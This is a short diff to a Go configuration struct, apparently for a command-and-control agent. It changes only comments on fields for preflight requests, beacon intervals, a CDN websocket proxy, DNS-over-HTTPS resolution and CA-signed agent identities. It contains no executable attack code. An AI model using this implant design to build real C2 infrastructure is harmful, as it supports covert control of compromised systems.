@@ -104,7 +104,7 @@ type Config struct {
 	// Preflight Config
 	PreflightEnabled bool              `cbor:"20,keyasint"` // Enable preflight check
 	PreflightURL     string            `cbor:"21,keyasint"` // URL for preflight check
-	PreflightMethod  string            `cbor:"22,keyasint"` // HTTP method (GET/POST) TODO: Implement method selection in client
+	PreflightMethod  string            `cbor:"22,keyasint"` // HTTP method (GET/POST) used for the preflight request
 	PreflightHeaders map[string]string `cbor:"23,keyasint"` // Headers for preflight request
 	// Beacon interval for Hybrid Mode
 	PreflightIntervalMin int `cbor:"29,keyasint"` // seconds
@@ -116,7 +116,8 @@ type Config struct {
 	CDNProxy         string `cbor:"27,keyasint"` // websocket proxy, see go-cdn2proxy
 	DoHServer        string `cbor:"28,keyasint"` // DNS over HTTPS server, for name resolving
 
-	// These were deprecated and removed
+	// Per-agent identity. AgentUUID is assigned by the builder; AgentTag and
+	// AgentUUIDSig are derived from it at runtime for C2 identification.
 	AgentUUID    string `cbor:"32,keyasint"` // UUID of agent, used to verify agent
 	AgentUUIDSig string `cbor:"33,keyasint"` // UUID of agent signed by CA
 	AgentTag     string `cbor:"34,keyasint"` // generated from UUID, will be used to identidy agents
